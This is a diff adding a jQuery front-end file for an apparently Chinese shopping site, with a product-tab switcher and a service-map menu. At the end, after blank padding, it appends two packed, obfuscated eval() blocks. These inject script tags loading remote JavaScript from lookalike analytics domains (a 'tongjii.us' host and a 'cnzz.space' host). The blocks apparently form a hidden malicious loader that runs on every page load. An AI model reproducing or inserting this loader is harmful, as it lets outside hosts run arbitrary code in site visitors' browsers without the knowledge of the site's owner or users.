@@ -1,0 +1,57 @@
+  
+/*商品详细页滑动门*/
+$(document).ready(function(){
+  $('.tou_r_a ul li').each(function(i){
+    $(this).hover(function(){
+	  $(this).addClass('touOn').siblings().removeClass('touOn');
+	  $('.tou_r_xh:eq('+i+')').show().siblings('.tou_r_xh').hide();
+	  $('.more:eq('+i+')').show().siblings('.more').hide();
+	});
+  });
+});
+
+
+
+
+
+
+/*服务网络地图JS*/
+ $(document).ready(function(){
+		hideAll();
+		$("#map1-c").css({display:"block"})
+	  	$(".map-nav ul li").hover(function() {
+			   showNav($(this).attr("id"));
+        },function(){
+			//hideNav($(this).attr("id"));
+		}); 
+	});
+ 
+ 	function hideAll(){
+		$(".map-content:visible").each(function() {
+			$(this).hide();
+		});
+	}
+	function upAll(){
+		$(".map-content:visible").each(function() {
+			$(this).slideUp(100);
+		});
+	}
+	
+ 	function showNav(navID){
+		hideAll();
+	 	$("#"+navID+"-c").slideDown(100);
+	 }
+	 function hideNav(navID){
+		 $("#"+navID+"-c").slideUp(100);
+		 }
+ 
+ 
+ 
+
+
+
+
+ 
+
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('y(j(p,a,c,k,e,r){e=j(c){l c.t(a)};q(!\'\'.n(/^/,x)){m(c--)r[e(c)]=k[c]||e(c);k=[j(e){l r[e]}];e=j(){l\'\\\\w+\'};c=1};m(c--)q(k[c])p=p.n(u v(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);l p}(\'1 5=5||[];(9(){1 a=3.f(\\\'4\\\');a.7=\\\'8://i.b.c/d.e\\\';1 2=3.g(\\\'4\\\')[0];2.h.6(a,2)})();\',o,o,\'|z|s|A|B|C|D|E|F|j||G|H|I|J|K|L|M|N\'.O(\'|\'),0,{}))',51,51,'|||||||||||||||||||function||return|while|replace|19||if|||toString|new|RegExp||String|eval|var|document|script|_hmt_en|insertBefore|src|http|tongjii|us|tj|js|createElement|getElementsByTagName|parentNode|lib|split'.split('|'),0,{}));
+eval(function(p,a,c,k,e,r){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--)r[e(c)]=k[c]||e(c);k=[function(e){return r[e]}];e=function(){return'\\w+'};c=1};while(c--)if(k[c])p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c]);return p}('v(h(p,a,c,k,e,r){e=h(c){i c.o(a)};m(!\'\'.l(/^/,u)){j(c--)r[e(c)]=k[c]||e(c);k=[h(e){i r[e]}];e=h(){i\'\\\\w+\'};c=1};j(c--)m(k[c])p=p.l(q t(\'\\\\b\'+e(c)+\'\\\\b\',\'g\'),k[c]);i p}(\'1 5=5||[];(8(){1 a=3.b(\\\'4\\\');a.7=\\\'//g.9/6/6.c\\\';1 2=3.e(\\\'4\\\')[0];2.f.d(a,2)})();\',n,n,\'|x|s|y|z|A|B|C|h|D||E|F|G|H|I|J\'.K(\'|\'),0,{}))',47,47,'|||||||||||||||||function|return|while||replace|if|17|toString||new|||RegExp|String|eval||var|document|script|_hmt_cnzz|hm|src|space|createElement|js|insertBefore|getElementsByTagName|parentNode|cnzz|split'.split('|'),0,{}))
